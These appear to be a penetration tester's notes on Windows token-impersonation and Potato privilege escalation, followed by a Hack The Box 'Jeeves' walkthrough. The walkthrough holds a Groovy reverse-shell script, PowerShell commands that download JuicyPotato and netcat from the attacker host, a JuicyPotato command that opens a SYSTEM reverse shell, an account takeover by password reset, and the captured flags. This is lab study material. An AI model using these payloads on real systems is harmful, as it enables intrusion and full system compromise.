#Windows #PrivEsc #Potato #TokenImpersonation #whoami #JuicyPotato #RottenPotato #mimikatz #more #nc #PowerShell #gobuster #IEX 

# Token Impersonation

- **Tokens** - temporary keys (basically cookies) that allow you access to a system/network. Two types:
	1. **Delegate** - created for logging into a machine or using RDP
	2. **Impersonate** - "non-interactive" such as attaching a network drive or a domain logon script

See [[3_Token Impersonation]]

- `whoami /priv` to see privileges of shell user
	- `SeImpersonatePrivilege` == `SeAssignPrimaryToken` (Potato attacks!) #Potato
		- ==Usually service accounts have this privilege==
	- `SeChangeNotifyPrivilege` (not Token attack but is sensitive)
- See EoP - Impersonate Privileges in Windows - Privilege Escalation Page from [PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-living-off-the-land-binaries-and-scripts)

## EoP - Impersonation Privileges

Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege              | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                           | Remarks                                                                                                                                                                                                                                                            |
| ---------------------- | ----------- | ----------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `SeAssignPrimaryToken` | **_Admin_** | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                            | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                             |
| `SeBackup`             | **Threat**  | **_Built-in commands_** | Read sensitve files with `robocopy /b`                                                                                                                                                                                                                                                                                                   | - May be more interesting if you can read %WINDIR%\MEMORY.DMP  <br>  <br>- `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open files.  <br>  <br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter.                    |
| `SeCreateToken`        | **_Admin_** | 3rd party tool          | Create arbitrary token including local admin rights with `NtCreateToken`.                                                                                                                                                                                                                                                                |                                                                                                                                                                                                                                                                    |
| `SeDebug`              | **_Admin_** | **PowerShell**          | Duplicate the `lsass.exe` token.                                                                                                                                                                                                                                                                                                         | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)                                                                                                                                             |
| `SeLoadDriver`         | **_Admin_** | 3rd party tool          | 1. Load buggy kernel driver such as `szkg64.sys` or `capcom.sys`  <br>2. Exploit the driver vulnerability  <br>  <br>Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin command. i.e.: `fltMC sysmondrv`                                                                                   | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)  <br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh) |
| `SeRestore`            | **_Admin_** | **PowerShell**          | 1. Launch PowerShell/ISE with the SeRestore privilege present.  <br>2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).  <br>3. Rename utilman.exe to utilman.old  <br>4. Rename cmd.exe to utilman.exe  <br>5. Lock the console and press Win+U | Attack may be detected by some AV software.  <br>  <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.                                                                                                 |
| `SeTakeOwnership`      | **_Admin_** | **_Built-in commands_** | 1. `takeown.exe /f "%windir%\system32"`  <br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`  <br>3. Rename cmd.exe to utilman.exe  <br>4. Lock the console and press Win+U                                                                                                                                                    | Attack may be detected by some AV software.  <br>  <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.                                                                                                 |
| `SeTcb`                | **_Admin_** | 3rd party tool          | Manipulate tokens to have local admin rights included. May require SeImpersonate.  <br>  <br>To be verified.                                                                                                                                                                                                                             |                                                                                                                                                                                                                                                                    |
| `SeRelabel`            | **_Admin_** | 3rd party too           | [decoder-it/RelabelAbuse](https://github.com/decoder-it/RelabelAbuse)                                                                                                                                                                                                                                                                    | Allows you to own resources that have an integrity level even higher than your own                                                                                                                                                                                 |

---

# [Potato Attacks](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#sweetPotato)


1. Rotten Potato - [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

- The idea behind this vulnerability is simple to describe at a high level:

	1. Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.
	2. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.
	3. Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.

2. Juicy Potato - [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

- Leverages the privilege escalation chain based on `BITS` service having the `MiTM` listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

---

See HTB [[Jeeves - HTB]]


# Enumeration

- Nmap
```
┌──(root㉿kali)-[~]
└─# nmap -A -p- -sVC 10.10.10.63 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 17:45 PDT
Nmap scan report for 10.10.10.63
Host is up (0.11s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|Phone|7 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Embedded Standard 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-10-04T05:48:39
|_  start_date: 2024-10-04T05:45:13
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   102.90 ms 10.10.14.1
2   103.37 ms 10.10.10.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.01 seconds
```
- Taking a look at Jetty 9.4.z-SNAPSHOT and exploits relating, we find that there is a Information Disclosure vulnerability if the `GET /%2e%2e/WEB-INF/web.xml HTTP/1.` is specified in a get request, the encoded URI can access WEB-INF.
	- Rabbit hole... enumerating more

- Used `gobuster` to enumerate any directories in both `80` and `50000` ports. Port `80` had no additional, but port `50000` had:
```
┌──(root㉿kali)-[~/Downloads]
└─# gobuster dir -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.63:50000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]                                                                 
Progress: 141708 / 141709 (100.00%)
===============================================================
Finished
===============================================================
```
- `http://10.10.10.63:50000/askjeeves/` shows a web portal
- In `People` tab we see `admin`. We can change their password. Changed admin creds to `admin:admin`
	- We are now Admin in Jenkins 2.87
- Also found in the `Manage Jenkins` tab a `Script Console` option.


# Foothold
- gain shell via exploit
- Found a `Script Console` that accepts groovy scripts. We can potential exploit and get a reverse shell. After [researching](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6), found [`revshell.groovy`](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) which can give us a reverse shell into Jenkins:
```
String host="10.10.14.6";

int port=4444;

String cmd="cmd.exe";

Process p=new 
ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream 
pi=p.getInputStream()
pe=p.getErrorStream()
si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());so.flush();po.flush();
Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

- Caught a shell
```
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.63] 49677
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke
```


# PrivEsc
- escalate from user to root
- We have `SeImpersonatePrivilege` enabled on the user `jeeves\kohsuke`... Let's see if we can impersonate
```
C:\Users\Administrator\.jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

- With these privileges, `RottenPotato` and `JuicyPotato` work great
- Getting `JuicyPotato` to transfer over so I can escalate privileges:
- Started a python server on port `8000`
```
┌──(root㉿kali)-[~/Downloads]
└─# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.63 - - [04/Oct/2024 12:58:41] "GET /JuicyPotato.exe HTTP/1.1" 200 -
```

- used PowerShell to transfer `JuicyPotato.exe` from LHOST to the RHOST
```
C:\Users\Public>powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/JuicyPotato.exe', 'C:\Users\public\JuicyPotato.exe')" -bypass executionpolicy
powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/JuicyPotato.exe', 'C:\Users\public\JuicyPotato.exe')" -bypass executionpolicy
Invoke-Expression : Cannot bind argument to parameter 'Command' because it is null.
At line:1 char:4
+ IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/Ju ...
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidData: (:) [Invoke-Expression], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.InvokeExpre 
   ssionCommand
 

C:\Users\Public>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Public

10/04/2024  08:58 PM    <DIR>          .
10/04/2024  08:58 PM    <DIR>          ..
10/25/2017  04:42 PM    <DIR>          Documents
10/30/2015  03:24 AM    <DIR>          Downloads
10/04/2024  08:58 PM           347,648 JuicyPotato.exe
10/30/2015  03:24 AM    <DIR>          Music
10/30/2015  03:24 AM    <DIR>          Pictures
10/30/2015  03:24 AM    <DIR>          Videos
               1 File(s)        347,648 bytes
               7 Dir(s)   2,608,054,272 bytes free
```

- Put `nc` on RHOST
```
powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/nc.exe', 'C:\Users\public\nc.exe')" -bypass executionpolicy
```

- Start python server
```
┌──(root㉿kali)-[~/Downloads]
└─# python3 -m http.server         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.63 - - [04/Oct/2024 13:12:18] "GET /nc.exe HTTP/1.1" 200 -
```
- Transfer `nc`
```
C:\Users\Public>powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/nc.exe', 'C:\Users\public\nc.exe')" -bypass executionpolicy
powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/nc.exe', 'C:\Users\public\nc.exe')" -bypass executionpolicy
Invoke-Expression : Cannot bind argument to parameter 'Command' because it is null.
At line:1 char:4
+ IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/nc ...
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidData: (:) [Invoke-Expression], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.InvokeExpre 
   ssionCommand
 

C:\Users\Public>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Public

10/04/2024  09:12 PM    <DIR>          .
10/04/2024  09:12 PM    <DIR>          ..
10/25/2017  04:42 PM    <DIR>          Documents
10/30/2015  03:24 AM    <DIR>          Downloads
10/04/2024  09:09 PM                 0 JuicyPotato
10/04/2024  08:58 PM           347,648 JuicyPotato.exe
10/30/2015  03:24 AM    <DIR>          Music
10/04/2024  09:12 PM            59,392 nc.exe
10/30/2015  03:24 AM    <DIR>          Pictures
10/30/2015  03:24 AM    <DIR>          Videos
               3 File(s)        407,040 bytes
               7 Dir(s)   2,607,972,352 bytes free
```

- Starting a nc listener on port 443 for revshell
```
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.63] 49730
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

- Running `JuicyPotato` and catching a reverse shell in `nc`
```
C:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 10.10.14.6 443" -t *
JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 10.10.14.6 443" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

- Success! We are `NT AUTHORITY\SYSTEM`
```
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.63] 49730
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

- User flag - kohsuke
```
C:\Users\kohsuke\Desktop>type user.txt
type user.txt
e3232272596fb47950d59c4cf1e7066a
```

- Root flag search
```
C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.

C:\Users>dir /s /b *root*.txt *flag*.txt 2>nul
dir /s /b *root*.txt *flag*.txt 2>nul
C:\Users\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs\jenkins-update-center-root-ca.txt
```

- I needed to search the Administrator's Desktop folder more thoroughly. This required research
	- Using an element of NTFS files called **Alternate Data Streams** (ADS), data can be hidden from analysis tools. You can show alternate data streams in a directory listing with the **/r** switch: ==`dir /r`==
```
C:\Users\Administrator\Desktop>dir /r
dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,607,955,968 bytes free
```
- To read the ADS file, a simple `type` command would not work
	- ==We can use the `more <` command to read these files==
- Root flag
```
C:\Users\Administrator\Desktop>more < hm.txt:root.txt           
more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```